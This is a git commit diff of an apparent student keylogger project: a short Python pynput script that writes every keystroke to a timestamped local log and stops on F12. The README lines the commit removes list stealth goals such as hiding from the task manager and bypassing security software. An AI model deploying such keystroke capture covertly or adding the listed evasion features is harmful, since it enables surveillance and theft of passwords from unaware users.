cbadaad539ad08520acc79c62d2f0b81491cc2a3
Kevin <kevin.chu1@student.unsw.edu.au>
2020-01-28 07:51:21 +1100

    Finalised Project

--- README.md
+++ README.md
@@ -1,9 +1,7 @@
 # Keylogger
-## Desired Features
-Tracks all keystrokes including macro keys
+Keylogging is the act of recording the keys struct on a keyboard.
 
-On startup, application opens by itself
-
-Hide program from registry, process list, task manager, system tray, add/remove programs
-
-Bypass security software
+## Features
+* Tracks all keystrokes including macro keys and custom keys.
+* Outputs all the keys pressed into a logging file of the format log-{%Y-%m-%d_%H-%M-%S} in a "log" file.
+* Safeguard shutdown application key (F12). F12 was chosen as it is rarely used.
--- keylogger.py
+++ keylogger.py
@@ -3,38 +3,43 @@ Simple keylogger
 Tracks keystrokes and saves it into a file dated to when the program started
 """
 
-import os
-import sys
-import time
-from pynput import keyboard
+from os.path import exists # Checking if valid log file name
+from os import makedirs # Creating directory to store logs
+from time import strftime # Creating log file name
+from sys import exit as sysexit # Stop program
+from pynput import keyboard # Log keystrokes
 
-# Creating file to store keys
-if not os.path.exists("logs"):
-    os.makedirs("logs")
-DATE = time.strftime("log-%Y-%m-%d_%H-%M-%S")
-
-# Given a key, writes it to a file
 def on_key_press(key):
+    """
+    Given a key, writes it to a file
+    """
     # Log key
     try:
         # Text Key
-        file = open("logs/" + DATE + ".txt", "a")
+        file = open(FILENAME, "a")
         file.write(key.char)
         file.close()
     except AttributeError:
         # Adjustment Key
-        file = open("logs/" + DATE + ".txt", "a")
-        file.write("[{0}]".format(key))
+        file = open(FILENAME, "a")
+        file.write(f"[{key}]")
         file.close()
     except TypeError:
         # Custom Key
-        file = open("logs/" + DATE + ".txt", "a")
-        file.write("[Custom: {0}]".format(key))
+        file = open(FILENAME, "a")
+        file.write(f"[Custom: {key}]")
         file.close()
 
     # Stop keylogger
     if key == keyboard.Key.f12:
-        sys.exit()
+        sysexit()
+
+# Creating file to store keys
+if not exists("logs"):
+    makedirs("logs")
+
+# Creating FILENAME
+FILENAME = ("logs/{}.txt").format(strftime("log-%Y-%m-%d_%H-%M-%S"))
 
 with keyboard.Listener(on_press=on_key_press) as listener:
     listener.join()
